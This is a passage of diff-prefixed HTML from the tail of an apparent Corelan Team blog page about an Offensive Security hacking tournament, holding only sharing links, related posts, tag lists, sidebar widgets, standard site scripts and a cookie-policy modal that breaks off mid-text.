+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-3767" class="share-twitter sd-button share-icon" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-3767" class="share-facebook sd-button share-icon" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-3767" class="share-linkedin sd-button share-icon" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-telegram"><a rel="nofollow noopener noreferrer" data-shared="" class="share-telegram sd-button share-icon" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/?share=telegram" target="_blank" title="Click to share on Telegram"><span>Telegram</span></a></li><li class="share-print"><a rel="nofollow noopener noreferrer" data-shared="" class="share-print sd-button share-icon" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/#print" target="_blank" title="Click to print"><span>Print</span></a></li><li class="share-end"></li></ul></div></div></div><h3 class="related_post_title">Related Posts:</h3><ul class="related_post"><li><a href="https://www.corelan.be/index.php/2010/06/22/how-strong-is-your-fu-hacking-for-charity/" title="How strong is your fu : Hacking for charity">How strong is your fu : Hacking for charity</a></li><li><a href="https://www.corelan.be/index.php/2010/06/23/how-strong-is-your-fu-2-the-report/" title="How strong is your fu 2 – the report">How strong is your fu 2 – the report</a></li><li><a href="https://www.corelan.be/index.php/2012/05/17/hack-in-the-box-amsterdam-2012-preview/" title="Hack In The Box Amsterdam 2012 – Preview">Hack In The Box Amsterdam 2012 – Preview</a></li><li><a href="https://www.corelan.be/index.php/2012/05/14/reversing-101-solving-a-protectionscheme/" title="Reversing 101 – Solving a protection scheme">Reversing 101 – Solving a protection scheme</a></li><li><a href="https://www.corelan.be/index.php/2011/04/03/hitb-2011-ctf-reversing-vectored-exception-handling-veh/" title="HITB 2011 CTF – Reversing Vectored Exception Handling (VEH)">HITB 2011 CTF – Reversing Vectored Exception Handling (VEH)</a></li><li><a href="https://www.corelan.be/index.php/2011/03/30/honeynet-workshop-2011/" title="Honeynet Workshop 2011">Honeynet Workshop 2011</a></li><li><a href="https://www.corelan.be/index.php/2011/03/17/blackhat-europe-2011-day-01/" title="BlackHat Europe 2011 / Day 01">BlackHat Europe 2011 / Day 01</a></li><li><a href="https://www.corelan.be/index.php/2011/03/14/codegate-2011-ctf-binary200-anti-debugging-techniques/" title="Codegate 2011 CTF – Binary200 – Anti Debugging Techniques Explained">Codegate 2011 CTF – Binary200 – Anti Debugging Techniques Explained</a></li><li><a href="https://www.corelan.be/index.php/2011/02/27/anti-debugging-tricks-revealed-defcon-ctf-qualifications-2009-bin300-analysis/" title="Anti-debugging tricks revealed – Defcon CTF Qualifications 2009: Bin300 Analysis">Anti-debugging tricks revealed – Defcon CTF Qualifications 2009: Bin300 Analysis</a></li><li><a href="https://www.corelan.be/index.php/2010/11/13/offensive-security-exploit-weekend/" title="Offensive Security Exploit Weekend">Offensive Security Exploit Weekend</a></li></ul>	                    
+	                </div>
+	                <div class="cleared"></div>
+	                <div class="art-postmetadatafooter"><div class="art-postfootericons art-metadata-icons"><span class="categories">Posted in</span> <a href="https://www.corelan.be/index.php/category/security/" rel="category tag">001_Security</a>, <a href="https://www.corelan.be/index.php/category/security/exploits/" rel="category tag">Exploits</a> | <span class="tags">Tagged</span> <a href="https://www.corelan.be/index.php/tag/2385/" rel="tag">--</a>, <a href="https://www.corelan.be/index.php/tag/security/" rel="tag">001_Security</a>, <a href="https://www.corelan.be/index.php/tag/192-168-6-66/" rel="tag">192-168-6-66</a>, <a href="https://www.corelan.be/index.php/tag/capture/" rel="tag">capture</a>, <a href="https://www.corelan.be/index.php/tag/ctf/" rel="tag">ctf</a>, <a href="https://www.corelan.be/index.php/tag/flag/" rel="tag">flag</a>, <a href="https://www.corelan.be/index.php/tag/hacking/" rel="tag">hacking</a>, <a href="https://www.corelan.be/index.php/tag/hacklab-vpn/" rel="tag">hacklab-vpn</a>, <a href="https://www.corelan.be/index.php/tag/n00bfilter/" rel="tag">n00bfilter</a>, <a href="https://www.corelan.be/index.php/tag/nc-backshell-invalid-connection/" rel="tag">nc-backshell-invalid-connection</a>, <a href="https://www.corelan.be/index.php/tag/nox-of-xr-offensive-security-team/" rel="tag">nox-of-xr-offensive-security-team</a>, <a href="https://www.corelan.be/index.php/tag/offensive-security/" rel="tag">offensive security</a>, <a href="https://www.corelan.be/index.php/tag/offensive-security-labs-exercises/" rel="tag">offensive-security-labs-exercises</a>, <a href="https://www.corelan.be/index.php/tag/offsec-lab/" rel="tag">offsec-lab</a>, <a href="https://www.corelan.be/index.php/tag/offsec-lab-firewall/" rel="tag">offsec-lab-firewall</a>, <a href="https://www.corelan.be/index.php/tag/pentestexploitsexploitdbplatformslinuxremote340-c-imap/" rel="tag">pentestexploitsexploitdbplatformslinuxremote340-c-imap</a>, <a href="https://www.corelan.be/index.php/tag/screenos-import-pfx/" rel="tag">screenos-import-pfx</a>, <a href="https://www.corelan.be/index.php/tag/smtx-video-ghost-challenge-write-up/" rel="tag">smtx-video-ghost-challenge-write-up</a>, <a href="https://www.corelan.be/index.php/tag/surgemail-3-8k4-4-d-download/" rel="tag">surgemail-3-8k4-4-d-download</a>, <a href="https://www.corelan.be/index.php/tag/tournament/" rel="tag">tournament</a></div></div>	            </div>
+			<div class="cleared"></div>
+	    </div>
+	</div>
+	
+	<div class="art-post">
+	    <div class="art-post-tl"></div>
+	    <div class="art-post-tr"></div>
+	    <div class="art-post-bl"></div>
+	    <div class="art-post-br"></div>
+	    <div class="art-post-tc"></div>
+	    <div class="art-post-bc"></div>
+	    <div class="art-post-cl"></div>
+	    <div class="art-post-cr"></div>
+	    <div class="art-post-cc"></div>
+	    <div class="art-post-body">
+	            <div class="art-post-inner art-article">
+	            	                <div class="art-postcontent">
+	                    
+	                    <h4 id="comments">18 Responses to <em>Offensive Security Hacking Tournament – How strong was my fu ?</em></h4>	                    
+	                </div>
+	                <div class="cleared"></div>
+	                	            </div>
+			<div class="cleared"></div>
+	    </div>
+	</div>
+	
+	<ul id="comments-list">
+
+
+
+
+
+
+<ul class="children">
+
+</ul>
+
+
+
+
+
+<ul class="children">
+
+</ul>
+
+<ul class="children">
+<ul class="children">
+
+</ul>
+
+</ul>
+
+</ul>
+
+
+          <div class="cleared"></div>
+        </div>
+        <div class="art-layout-cell art-sidebar1">
+          <div class="art-block widget widget_search" id="search-2">
+    <div class="art-block-tl"></div>
+    <div class="art-block-tr"></div>
+    <div class="art-block-bl"></div>
+    <div class="art-block-br"></div>
+    <div class="art-block-tc"></div>
+    <div class="art-block-bc"></div>
+    <div class="art-block-cl"></div>
+    <div class="art-block-cr"></div>
+    <div class="art-block-cc"></div>
+    <div class="art-block-body"><div class="art-blockcontent">
+    <div class="art-blockcontent-body"> <form method="get" name="searchform" action="https://www.corelan.be/">
+    <div class="search">
+        <input name="s" type="text" style="width: 95%;" class="joplin-clipper-hidden">
+        <span class="art-button-wrapper">
+            <span class="art-button-l"> </span>
+            <span class="art-button-r"> </span>
+            <input class="art-button joplin-clipper-hidden" type="submit" name="search" value="Search">
+        </span>
+    </div>
+</form>
+		<div class="cleared"></div>
+    </div>
+</div>		<div class="cleared"></div>
+    </div>
+</div><div class="art-block widget widget_text" id="text-5">
+    <div class="art-block-tl"></div>
+    <div class="art-block-tr"></div>
+    <div class="art-block-bl"></div>
+    <div class="art-block-br"></div>
+    <div class="art-block-tc"></div>
+    <div class="art-block-bc"></div>
+    <div class="art-block-cl"></div>
+    <div class="art-block-cr"></div>
+    <div class="art-block-cc"></div>
+    <div class="art-block-body"><div class="art-blockheader">
+    <h3 class="t">Corelan Training</h3>
+</div><div class="art-blockcontent">
+    <div class="art-blockcontent-body">			<div class="textwidget">We 
+have been teaching our win32 exploit dev classes at various security 
+cons and private companies &amp; organizations since 2011 <br><br>Check out our schedules page <b><a href="https://www.corelan-training.com/index.php/training/training-schedules/">here</a> and sign up for one of our classes now!</b></div>
+				<div class="cleared"></div>
+    </div>
+</div>		<div class="cleared"></div>
+    </div>
+</div><div class="art-block widget widget_text" id="text-9">
+    <div class="art-block-tl"></div>
+    <div class="art-block-tr"></div>
+    <div class="art-block-bl"></div>
+    <div class="art-block-br"></div>
+    <div class="art-block-tc"></div>
+    <div class="art-block-bc"></div>
+    <div class="art-block-cl"></div>
+    <div class="art-block-cr"></div>
+    <div class="art-block-cc"></div>
+    <div class="art-block-body"><div class="art-blockheader">
+    <h3 class="t">Donate</h3>
+</div><div class="art-blockcontent">
+    <div class="art-blockcontent-body">			<div class="textwidget">Want to support the Corelan Team community ? <a href="https://www.corelan.be/index.php/donate/"><b>Click here to go to our donations page.</b></a><br><br>
+<center>Want to donate BTC to Corelan Team? <br><br>
+<img src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/donate_btc_to_corelan_thumb.png" ,height="158" width="160"></center><br><br>Your donation will help funding server hosting.</div>
+				<div class="cleared"></div>
+    </div>
+</div>		<div class="cleared"></div>
+    </div>
+</div><div class="art-block widget Advman_Widget" id="advman-6">
+    <div class="art-block-tl"></div>
+    <div class="art-block-tr"></div>
+    <div class="art-block-bl"></div>
+    <div class="art-block-br"></div>
+    <div class="art-block-tc"></div>
+    <div class="art-block-bc"></div>
+    <div class="art-block-cl"></div>
+    <div class="art-block-cr"></div>
+    <div class="art-block-cc"></div>
+    <div class="art-block-body"><div class="art-blockcontent">
+    <div class="art-blockcontent-body"><script type="text/javascript" class="joplin-clipper-hidden"><!--
+google_ad_client = "ca-pub-8134501503628637";
+/* Sidebar */
+google_ad_slot = "4006062044";
+google_ad_width = 160;
+google_ad_height = 600;
+//-->
+</script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/show_ads.js" class="joplin-clipper-hidden">
+</script><ins id="aswift_0_expand" style="display:inline-table;border:none;height:600px;margin:0;padding:0;position:relative;visibility:visible;width:160px;background-color:transparent;" data-ad-slot="4006062044"><ins id="aswift_0_anchor" style="display:block;border:none;height:600px;margin:0;padding:0;position:relative;visibility:visible;width:160px;background-color:transparent;"><iframe id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0;width:160px;height:600px;" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/ads.html" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!1" data-google-query-id="COTd5Pa_xusCFRnZ7QodixUDGQ" data-load-complete="true" width="160" height="600" frameborder="0"></iframe></ins></ins>
+		<div class="cleared"></div>
+    </div>
+</div>		<div class="cleared"></div>
+    </div>
+</div><div class="art-block widget widget_text" id="text-3">
+    <div class="art-block-tl"></div>
+    <div class="art-block-tr"></div>
+    <div class="art-block-bl"></div>
+    <div class="art-block-br"></div>
+    <div class="art-block-tc"></div>
+    <div class="art-block-bc"></div>
+    <div class="art-block-cl"></div>
+    <div class="art-block-cr"></div>
+    <div class="art-block-cc"></div>
+    <div class="art-block-body"><div class="art-blockheader">
+    <h3 class="t">Corelan Team Merchandise</h3>
+</div><div class="art-blockcontent">
+    <div class="art-blockcontent-body">			<div class="textwidget">You can support Corelan Team by donating or purchasing items from <b><a href="http://www.cafepress.com/CorelanTeam">the official Corelan Team merchandising store.</a></b> <br></div>
+				<div class="cleared"></div>
+    </div>
+</div>		<div class="cleared"></div>
+    </div>
+</div><div class="art-widget widget widget_text" id="text-2"><div class="art-widget-content">			<div class="textwidget"><br><center><a href="http://www.copyscape.com/plagiarism-tool/"><img src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/cs-gy-88x31.gif" alt="Protected by Copyscape Web Plagiarism Tool" title="Protected by Copyscape Plagiarism Checker - Do not copy content from this page." width="88" height="31" border="0"></a></center><br></div>
+		</div></div><div class="art-block widget widget_text" id="text-6">
+    <div class="art-block-tl"></div>
+    <div class="art-block-tr"></div>
+    <div class="art-block-bl"></div>
+    <div class="art-block-br"></div>
+    <div class="art-block-tc"></div>
+    <div class="art-block-bc"></div>
+    <div class="art-block-cl"></div>
+    <div class="art-block-cr"></div>
+    <div class="art-block-cc"></div>
+    <div class="art-block-body"><div class="art-blockheader">
+    <h3 class="t">Corelan on Slack</h3>
+</div><div class="art-blockcontent">
+    <div class="art-blockcontent-body">			<div class="textwidget"><p>You can chat with us and our friends on our Slack workspace:</p>
+<li>Go to <a href="https://www.facebook.com/corelanconsulting">our facebook page</a></li>
+<li>Browse through the posts and find the invite to Slack</li>
+<li>Use the invite to access our Slack workspace</li>
+</div>
+				<div class="cleared"></div>
+    </div>
+</div>		<div class="cleared"></div>
+    </div>
+</div><div class="art-block widget widget_meta" id="meta-2">
+    <div class="art-block-tl"></div>
+    <div class="art-block-tr"></div>
+    <div class="art-block-bl"></div>
+    <div class="art-block-br"></div>
+    <div class="art-block-tc"></div>
+    <div class="art-block-bc"></div>
+    <div class="art-block-cl"></div>
+    <div class="art-block-cr"></div>
+    <div class="art-block-cc"></div>
+    <div class="art-block-body"><div class="art-blockheader">
+    <h3 class="t">Actions</h3>
+</div><div class="art-blockcontent">
+    <div class="art-blockcontent-body">
+		<ul>
+						<li><a href="https://www.corelan.be/wp-login.php">Log in</a></li>
+			<li><a href="https://www.corelan.be/index.php/feed/">Entries feed</a></li>
+			<li><a href="https://www.corelan.be/index.php/comments/feed/">Comments feed</a></li>
+
+			<li><a href="https://wordpress.org/">WordPress.org</a></li>
+		</ul>
+
+				<div class="cleared"></div>
+    </div>
+</div>		<div class="cleared"></div>
+    </div>
+</div><div class="art-block widget widget_categories" id="categories-3">
+    <div class="art-block-tl"></div>
+    <div class="art-block-tr"></div>
+    <div class="art-block-bl"></div>
+    <div class="art-block-br"></div>
+    <div class="art-block-tc"></div>
+    <div class="art-block-bc"></div>
+    <div class="art-block-cl"></div>
+    <div class="art-block-cr"></div>
+    <div class="art-block-cc"></div>
+    <div class="art-block-body"><div class="art-blockheader">
+    <h3 class="t">Categories</h3>
+</div><div class="art-blockcontent">
+    <div class="art-blockcontent-body"><form action="https://www.corelan.be" method="get"><label class="screen-reader-text" for="cat">Categories</label><select name="cat" id="cat" class="postform joplin-clipper-hidden">
+	<option value="-1" selected="selected">Select Category</option>
+	<option class="level-0" value="6">001_Security</option>
+	<option class="level-1" value="1164">&nbsp;&nbsp;&nbsp;Cons and Seminars</option>
+	<option class="level-1" value="4017">&nbsp;&nbsp;&nbsp;Crypto</option>
+	<option class="level-1" value="3892">&nbsp;&nbsp;&nbsp;CSO</option>
+	<option class="level-1" value="1037">&nbsp;&nbsp;&nbsp;Exploit Writing Tutorials</option>
+	<option class="level-1" value="803">&nbsp;&nbsp;&nbsp;Exploits</option>
+	<option class="level-1" value="3464">&nbsp;&nbsp;&nbsp;Fuzzing</option>
+	<option class="level-1" value="1373">&nbsp;&nbsp;&nbsp;Malware and Reversing</option>
+	<option class="level-1" value="3736">&nbsp;&nbsp;&nbsp;Metasploit</option>
+	<option class="level-1" value="1549">&nbsp;&nbsp;&nbsp;mona</option>
+	<option class="level-1" value="1257">&nbsp;&nbsp;&nbsp;Papers</option>
+	<option class="level-1" value="1492">&nbsp;&nbsp;&nbsp;Pentesting</option>
+	<option class="level-1" value="3465">&nbsp;&nbsp;&nbsp;Root Cause Analysis</option>
+	<option class="level-1" value="3469">&nbsp;&nbsp;&nbsp;Tools</option>
+	<option class="level-1" value="1456">&nbsp;&nbsp;&nbsp;Video</option>
+	<option class="level-1" value="1236">&nbsp;&nbsp;&nbsp;Web Application Security</option>
+	<option class="level-2" value="3697">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQL Injection</option>
+	<option class="level-0" value="10">Active Directory</option>
+	<option class="level-0" value="283">Certificates</option>
+	<option class="level-0" value="241">Cisco</option>
+	<option class="level-0" value="224">Development</option>
+	<option class="level-0" value="124">Juniper</option>
+	<option class="level-0" value="3760">Legal</option>
+	<option class="level-0" value="8">Linux and Unix</option>
+	<option class="level-0" value="12">MS Exchange</option>
+	<option class="level-0" value="11">My Free Tools</option>
+	<option class="level-0" value="5">Networking</option>
+	<option class="level-0" value="13">OpsMgr</option>
+	<option class="level-0" value="105">Outlook</option>
+	<option class="level-0" value="3990">Penetration testing</option>
+	<option class="level-0" value="34">Private</option>
+	<option class="level-0" value="465">Scripts</option>
+	<option class="level-1" value="466">&nbsp;&nbsp;&nbsp;Powershell</option>
+	<option class="level-0" value="4">Sharepoint</option>
+	<option class="level-0" value="9">Storage</option>
+	<option class="level-0" value="1">Uncategorized</option>
+	<option class="level-0" value="15">Virtualization</option>
+	<option class="level-0" value="14">Windows Client OS</option>
+	<option class="level-0" value="4059">Windows Internals</option>
+	<option class="level-0" value="7">Windows Server</option>
+	<option class="level-0" value="353">Wordpress</option>
+</select>
+</form>
+<script type="text/javascript" class="joplin-clipper-hidden">
+/* <![CDATA[ */
+(function() {
+	var dropdown = document.getElementById( "cat" );
+	function onCatChange() {
+		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
+			dropdown.parentNode.submit();
+		}
+	}
+	dropdown.onchange = onCatChange;
+})();
+/* ]]> */
+</script>
+
+					<div class="cleared"></div>
+    </div>
+</div>		<div class="cleared"></div>
+    </div>
+</div>          <div class="cleared"></div>
+        </div>
+    </div>
+</div>
+<div class="cleared"></div>
+    <div class="art-footer">
+                <div class="art-footer-t"></div>
+                <div class="art-footer-l"></div>
+                <div class="art-footer-b"></div>
+                <div class="art-footer-r"></div>
+                <div class="art-footer-body">
+                    
+
+
+                    <a href="https://www.corelan.be/index.php/feed/" class="art-rss-tag-icon" title="Corelan Team RSS Feed"></a>
+                  <div class="art-footer-text">
+                      <br><br>Copyright Peter Van Eeckhoutte © 2007 - 2020 | All Rights Reserved | <a href="https://www.corelan.be/index.php/terms-of-use/">Terms of use</a><br>			
+		      
+			
+                  </div>
+            		<div class="cleared"></div>
+                </div>
+            </div>
+    		<div class="cleared"></div>
+        </div>
+    </div>
+    <div class="cleared"></div>
+    <p class="art-page-footer"></p>
+</div>
+    <div id="wp-footer">
+	        
+
+<span id="bruteprotect_uptime_check_string" style="display:none;" class="joplin-clipper-hidden">7ads6x98y</span>
+<script type="text/javascript" class="joplin-clipper-hidden">
+//<![CDATA[
+function wo_map_console(url) {
+  window.open(url,"wo_map_console","height=650,width=800,toolbar=no,statusbar=no,scrollbars=yes").focus();
+}
+//]]>
+</script>
+
+		
+
+  <aside id="moove_gdpr_cookie_info_bar" class="moove-gdpr-info-bar-hidden moove-gdpr-align-center moove-gdpr-dark-scheme gdpr_infobar_postion_bottom" role="banner" aria-label="GDPR Cookie Banner">
+    <div class="moove-gdpr-info-bar-container">
+      <div class="moove-gdpr-info-bar-content">
+        
+<div class="moove-gdpr-cookie-notice">
+  <p>We are using cookies to give you the best experience on our website.</p>
+<p>You can find out more about which cookies we are using or switch them off in <span data-href="#moove_gdpr_cookie_modal" class="change-settings-button">settings</span>.</p>
+</div>
+        
+<div class="moove-gdpr-button-holder">
+  <button class="mgbutton moove-gdpr-infobar-allow-all joplin-clipper-hidden">Accept</button>
+  </div>
+      </div>
+      
+    </div>
+    
+  </aside>
+  
+
+	<script type="text/javascript" class="joplin-clipper-hidden">
+		window.WPCOM_sharing_counts = {"https:\/\/www.corelan.be\/index.php\/2010\/05\/10\/offensive-security-hacking-tournament-how-strong-was-my-fu\/":3767};
+	</script>
+				<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/comment-reply.js" id="comment-reply-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" id="toc-front-js-extra" class="joplin-clipper-hidden">
+/* <![CDATA[ */
+var tocplus = {"visibility_show":"show","visibility_hide":"hide","width":"Auto"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/front.js" id="toc-front-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" id="wp-postviews-cache-js-extra" class="joplin-clipper-hidden">
+/* <![CDATA[ */
+var viewsCacheL10n = {"admin_ajax_url":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","post_id":"3767"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/postviews-cache.js" id="wp-postviews-cache-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/auto-thickbox.js" id="thickbox-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/new-tab.js" id="page-links-to-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" id="moove_gdpr_frontend-js-extra" class="joplin-clipper-hidden">
+/* <![CDATA[ */
+var moove_frontend_gdpr_scripts = {"ajaxurl":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","post_id":"3767","plugin_dir":"https:\/\/www.corelan.be\/wp-content\/plugins\/gdpr-cookie-compliance","is_page":"","strict_init":"1","enabled_default":{"third_party":0,"advanced":0},"geo_location":"false","force_reload":"false","is_single":"1","current_user":"0","load_lity":"true","cookie_expiration":"365"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/main.js" id="moove_gdpr_frontend-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/effect.js" id="jquery-effects-core-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/effect-blind.js" id="jquery-effects-blind-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" id="wstbLayout-js-extra" class="joplin-clipper-hidden">
+/* <![CDATA[ */
+var stbUserOptions = {"mode":"css","cssOptions":{"roundedCorners":true,"mbottom":10,"imgHide":"https:\/\/www.corelan.be\/wp-content\/plugins\/wp-special-textboxes\/themes\/stb-dark\/minus.png","imgShow":"https:\/\/www.corelan.be\/wp-content\/plugins\/wp-special-textboxes\/themes\/stb-dark\/plus.png","strHide":"Hide","strShow":"Show"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/wstb.js" id="wstbLayout-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/wp-embed.js" id="wp-embed-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" id="sharing-js-js-extra" class="joplin-clipper-hidden">
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/sharing.js" id="sharing-js-js" class="joplin-clipper-hidden"></script>
+<script type="text/javascript" id="sharing-js-js-after" class="joplin-clipper-hidden">
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-linkedin', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-telegram', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtelegram', 'menubar=1,resizable=1,width=450,height=450' );
+				return false;
+			});
+</script>
+
+  <button data-href="#moove_gdpr_cookie_modal" id="moove_gdpr_save_popup_settings_button" style="display: block;bottom: 20px; left: 20px;" class="gdpr-floating-button-custom-position joplin-clipper-hidden">
+    <span class="moove_gdpr_icon"><span class="gdpr-icon moovegdpr-advanced"></span></span>
+    <span class="moove_gdpr_text">Change cookie settings</span>
+  </button>
+
+
+<div id="moove_gdpr_cookie_modal" class="lity-hide joplin-clipper-hidden" role="complementary" aria-label="GDPR Settings Screen">
+  <div class="moove-gdpr-modal-content moove-clearfix logo-position-center moove_gdpr_modal_theme_v1">
+    <button class="moove-gdpr-modal-close">
+      <span class="gdpr-sr-only">Close GDPR Cookie Settings</span>
+      <span class="gdpr-icon moovegdpr-arrow-close"></span>
+    </button>
+    <div class="moove-gdpr-modal-left-content">
+      
+<div class="moove-gdpr-company-logo-holder">
+  <img src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/corelan-gcv-small.jpg" alt="" class="img-responsive">
+</div>
+<!--  .moove-gdpr-company-logo-holder -->      <ul id="moove-gdpr-menu">
+        
+<li class="menu-item-on menu-item-privacy_overview menu-item-selected">
+  <button data-href="#privacy_overview" class="moove-gdpr-tab-nav"><span class="gdpr-icon moovegdpr-privacy-overview"></span> <span class="gdpr-nav-tab-title">Privacy Overview</span></button>
+</li>
+
+  <li class="menu-item-strict-necessary-cookies menu-item-off">
+    <button data-href="#strict-necessary-cookies" class="moove-gdpr-tab-nav"><span class="gdpr-icon moovegdpr-strict-necessary"></span> <span class="gdpr-nav-tab-title">Strictly Necessary Cookies</span></button>
+  </li>
+
+
+
+
+  <li class="menu-item-moreinfo menu-item-off">
+    <button data-href="#cookie_policy_modal" class="moove-gdpr-tab-nav"><span class="gdpr-icon moovegdpr-policy"></span> <span class="gdpr-nav-tab-title">Cookie Policy</span></button>
+  </li>
+      </ul>
+      
+<div class="moove-gdpr-branding-cnt">
+  </div>
+<!--  .moove-gdpr-branding -->    </div>
+    <!--  .moove-gdpr-modal-left-content -->
+    <div class="moove-gdpr-modal-right-content">
+      <div class="moove-gdpr-modal-title">
+         
+      </div>
+      <!-- .moove-gdpr-modal-ritle -->
+      <div class="main-modal-content">
+
+        <div class="moove-gdpr-tab-content">
+          
+<div id="privacy_overview" class="moove-gdpr-tab-main">
+      <span class="tab-title">Privacy Overview</span>
+    <div class="moove-gdpr-tab-main-content">
+  	<p>a. Corelan respects your privacy. Most information accessible on or via the<br>
+Corelan Website is available without the need to provide personal information.<br>
+In certain cases you may however be requested to submit personal information. In<br>
+such case your personal information shall be treated in accordance with 
+the General Data Protection Regulation and any amendments hereof.</p>
+<p>b. All personal information made available by you will be treated solely for<br>
+the purpose of making available to you the requested information or services.<br>
+Your personal information will not be shared with third parties, but it 
+may be used for authentication, support &amp; marketing purposes in 
+relation with services provided by Corelan.</p>
+<p>c. We will only keep your personal information for as long as is required to<br>
+provide you with the requested information or services, or for any longer period<br>
+as may legally be required.</p>
+<p>d. It is our goal to reasonably protect the personal information made<br>
+available by you from third parties.</p>
+<p>e. You have the right to consult, correct, adjust or have removed your<br>
